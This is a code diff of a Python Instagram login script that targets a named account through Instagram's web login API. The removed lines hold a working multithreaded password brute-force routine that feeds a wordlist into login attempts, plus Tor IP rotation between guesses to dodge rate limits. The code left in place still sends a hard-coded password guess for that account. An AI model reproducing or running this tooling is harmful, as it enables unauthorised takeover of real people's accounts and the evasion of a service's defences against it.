@@ -97,57 +97,6 @@ class Instagram:
     def ipaddr(self) -> str:
         return self.session.get("https://httpbin.org/ip",proxies=self.use_tor.proxy()).json()["origin"]
 
-    def split_passwords(self, passwords, noft) -> list:
-        chunk_size = len(passwords) // noft
-        if chunk_size > 0:
-            return [
-                passwords[i : i + chunk_size]
-                for i in range(0, len(passwords), chunk_size)
-            ]
-        else:
-            return [passwords]
-
-    def bruteforce(self, threads, passlist):
-        with open(passlist, "r") as file:
-            passwords = file.read()
-        temp = self.split_passwords(passwords.split("\n"), threads)
-        for passwords_ in temp:
-            _thread.start_new_thread(lambda: self.try_passwords(passwords_), ())
-        while True:
-            os.system("clear")
-            print(
-                "\rCurrent Trying : {}\n Total Tried : {}".format(
-                    self.current_trying, self.tested_passwords
-                ),
-                end="",
-            )
-            time.sleep(0.1)
-            if self.ended == len(temp):
-                os.system("clear")
-                exit("Bad luck")
-
-    def try_passwords(self, passwords):
-        for password in passwords:
-            if password == "\n":
-                continue
-            self.current_trying = password
-
-            def test(passw):
-                try:
-                    try_ = self.login(passw)
-                except Exception:
-                    test(passw)
-                if (
-                    try_["message"]
-                    != "Sorry, your password was incorrect. Please double-check your password."
-                ):
-                    print(try_)
-                    exit()
-
-            test(password)
-            self.tested_passwords += 1
-        self.ended += 1
-
     def get_cookies(self):
         self.session.post(
             "https://i.instagram.com/api/v1/web/accounts/login/ajax/",
@@ -192,7 +141,6 @@ class Instagram:
         }
 
     def login(self, password) -> dict:
-        print(self.ipaddr())
         url = "https://i.instagram.com/api/v1/web/accounts/login/ajax/"
         data = {
             "username": f"{self.username}",
@@ -206,13 +154,10 @@ class Instagram:
         ).json()
 
 
-tor = Tor(9876, 4949)
-tor.start()
-ig = Instagram("cyberdioxide", use_tor=tor)
+#tor = Tor(9876, 4949)
+#tor.start()
+ig = Instagram("cyberdioxide", use_tor=None)
 
-for i in range(1, 20):
-    tor.change_ip()
-    print(ig.login("tessss" + str(i)))
+#tor.change_ip()
 
-print("final")
 print(ig.login("yarabs1256"))
